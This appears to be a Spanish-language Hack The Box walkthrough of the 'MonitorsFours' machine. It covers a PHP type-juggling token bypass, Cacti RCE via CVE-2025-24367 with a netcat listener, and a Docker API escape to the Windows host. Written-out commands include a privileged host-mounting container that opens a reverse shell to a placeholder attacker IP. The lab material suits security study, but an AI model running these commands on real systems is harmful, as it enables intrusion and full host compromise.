---

title: "MonitorsFours Hack The Box"
date: "2026-03-01"
description: "Explotacion de aplicacion web cacti y escalada de privilegios con Docker"
difficulty: "Easy"
tags: ["docker","cacti","web"]


---

![Banner MonitorsFours](/images/monitorsfours.png)

## 1. Reconocimiento y Enumeración Inicial

El escaneo de puertos identifica una **superficie de ataque híbrida**, compuesta por un servidor web Linux y servicios de administración remota de Windows.

### 📌 Escaneo de Puertos (Nmap)

| Puerto | Servicio | Versión / Detalle |
|------:|----------|-------------------|
| 80    | HTTP     | nginx (PHP 8.3.27) |
| 5985  | WinRM    | Microsoft HTTPAPI httpd 2.0 (Administración remota) |

---

## 2. Enumeración Web

Al explorar http://monitorsfour.htb se identifican los siguientes vectores:

- **Stack tecnológico:** PHP 8.3.27 sobre nginx  
- **Fuzzing de directorios:**  
  - Archivo .env expuesto  
  - Subdominio descubierto: cacti.monitorsfour.htb

### 🔥 Hallazgo Crítico: .env

```env
DB_PASSWORD=f******
DB_USER=monitorsdbuser
````

---

## 3. Acceso Inicial – Type Juggling en PHP

El endpoint /user expone una API que requiere un parámetro token.

```bash
curl http://monitorsfour.htb/user
{"error":"Missing token parameter"}
```

### Vulnerabilidad: Type Juggling (PHP 8.3)

PHP utiliza comparaciones débiles (==) que convierten tipos automáticamente.

> **Explicación técnica:**
> Si el código compara un token string con un entero (0) usando ==, y el string no comienza con un número, PHP lo convierte a 0.
> Resultado: "token_secreto" == 0 → true.

### Explotación

```text
http://monitorsfour.htb/user?token=0
```

El servidor valida el acceso y retorna un **volcado JSON con usuarios**.

### 🎯 Credenciales Obtenidas (tras crackear hashes MD5)

* **Usuario:** `marcus`
* **Password:** `w*********`

---

## 4. Intrusión en el Contenedor – Cacti RCE

Con las credenciales de marcus, se accede a:

```
http://cacti.monitorsfour.htb
```

* **Versión detectada:** Cacti v1.2.28
* **Vulnerabilidad:** Inyección en plantillas de gráfico
* **CVE:** CVE-2025-24367

> **Explicación técnica:**
> Cacti usa rrdtool para generar gráficos. Una sanitización deficiente de parámetros permite inyectar comandos del sistema, logrando **RCE** con privilegios administrativos.

### Pasos de Explotación

1. **Preparación**

   ```bash
   git clone https://github.com/TheCyberGeek/CVE-2025-24367-Cacti-PoC.git
   ```

2. **Oyente**

   ```bash
   nc -lvnp 4444
   ```

3. **Ejecución del exploit**

   ```bash
   python3 exploit_cacti.py \
     -u marcus -p ****** \
     -i <ATTACKER_IP> -l 4444 \
     -url http://cacti.monitorsfour.htb
   ```

4. **Resultado**

   * Reverse shell establecida
   * Acceso como www-data

---

## 5. Escalada de Privilegios – Escape de Docker (WSL2)

### Evidencia de Contenedor Docker

```bash
hostname
821fbd6a43fa

ls -la /
-rwxr-xr-x 1 root root 0 Nov 10 17:04 .dockerenv

uname -a
Linux ... microsoft-standard-WSL2
```

El entorno corresponde a **Docker Desktop sobre Windows (WSL2)**.

### Condición Crítica

* Contenedor con privilegios elevados
* Acceso a **Docker API expuesta internamente** (2375)
* IP común en WSL2: 192.168.65.7

```bash
curl http://192.168.65.7:2375/version
```

---

## 6. Escape al Host Windows vía Docker API

> **Teoría de la vulnerabilidad:**
> En Docker Desktop para Windows, exponer el demonio Docker en TCP (2375) dentro de WSL2 permite que cualquier contenedor controle el motor Docker y monte el disco del host (C:\).

### Cadena de Ataque

1. **Enumerar imágenes disponibles**

   ```bash
   curl http://192.168.65.7:2375/images/json
   ```

   Imagen válida encontrada:
   docker_setup-nginx-php:latest

2. **Crear contenedor malicioso (montando el host)**

   Ejemplo práctico:

   ```bash
   curl -X POST http://192.168.65.7:2375/containers/create \
     -H "Content-Type: application/json" \
     -d '{
       "Image":"alpine",
       "HostConfig":{
         "Binds":["/:/host"],
         "Privileged":true,
         "NetworkMode":"host"
       },
       "Cmd":["sh","-c",
         "chroot /host /bin/bash -c \"bash -i >& /dev/tcp/<IP-ATAKER>/9001 0>&1\""
       ]
     }'
   ```

3. **Iniciar contenedor**

   ```bash
   curl -X POST http://192.168.65.7:2375/containers/<ID>/start
   ```

### Resultado

* Reverse shell como **root en el host Windows**
* Acceso completo al sistema anfitrión

---

## 7. Post-Explotación y Flags

* **User Flag**

  ```
  /home/marcus/user.txt
  ```

* **Root Flag (Host Windows)**

  ```
  /mnt/host/c/Users/Administrator/Desktop/root.txt
  ```
